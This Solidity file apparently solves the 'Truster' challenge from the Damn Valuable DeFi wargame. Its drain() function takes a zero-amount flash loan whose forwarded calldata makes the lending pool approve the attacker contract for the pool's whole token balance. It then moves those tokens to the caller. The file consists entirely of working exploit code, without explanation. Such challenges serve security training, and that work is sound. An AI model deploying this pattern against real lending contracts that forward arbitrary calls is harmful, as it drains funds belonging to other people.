// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

contract Trustee {

    DamnValuableToken token;
    TrusterLenderPool pool;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
    }

    function drain() external {
        uint256 balance = token.balanceOf(address(pool));
        pool.flashLoan(
            0 ether, 
            address(this), 
            address(token), 
            abi.encodeWithSignature("approve(address,uint256)", address(this), balance)
        );

        token.transferFrom(address(pool), msg.sender,balance);
    }
}